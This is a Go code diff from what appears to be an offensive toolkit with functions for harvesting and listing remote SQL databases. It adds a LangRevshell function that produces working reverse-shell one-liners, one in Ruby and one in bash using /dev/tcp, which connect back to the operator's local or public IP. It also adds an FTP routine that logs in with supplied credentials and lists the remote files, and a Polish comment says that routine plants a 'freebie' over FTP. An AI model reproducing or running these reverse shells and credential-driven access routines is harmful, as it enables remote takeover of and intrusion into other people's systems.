@@ -21,6 +21,7 @@ import (
 	"github.com/fatih/color"
 	"github.com/GeertJohan/yubigo"
     _ "github.com/go-sql-driver/mysql"
+	"github.com/secsy/goftp"
 	"github.com/ztrue/tracerr"
 )
 
@@ -115,6 +116,7 @@ func HarvestDB(ip, username, password string, port int){
 	}
 }
 
+// Lists remote SQL databases
 func ListDB(db *sql.DB, tables bool) []string {
 	res, err := db.Query("SHOW DATABASES")
 	if tables {
@@ -130,9 +132,38 @@ func ListDB(db *sql.DB, tables bool) []string {
 	return result
 }
 
-// Ta funkcja wpierdala gratisa na port 21
-func Gratis(ip, username, password string) {
+// Generates a reverse shell in a given language to the current machine on arbitrary port
+func LangRevshell(language string, port int, global bool) string {
+	reverse_addr := GetLocalIP()
+	if (global){
+		reverse_addr = GetGlobalIP()	
+	}
+	rshell := ""
+	switch (language){
+	case "rb":
+		rshell = F("require 'socket';spawn(\"sh\",[:in,:out,:err]=>TCPSocket.new(\"%s\",%d))", reverse_addr, port)
+	case "sh":
+		rshell = F("bash -i >& /dev/tcp/%s/%d 0>&1", reverse_addr, port)
+	}
+	return rshell
+}
 
+// Ta funkcja wpierdala gratisa na FTP
+func Gratis(ip, username, password string, port int) {
+    config := goftp.Config{
+        User:               username,
+        Password:           password,
+        ConnectionsPerHost: port,
+        Timeout:            20 * time.Second,
+        Logger:             os.Stderr,
+    }
+    connection, err := goftp.DialConfig(config, ip)
+	Check(err)
+	listing, err := connection.ReadDir("/")
+	Check(err)
+    for _, file := range listing {
+        //file.Name()
+    }
 }
 
 // Verifies Yubico OTP
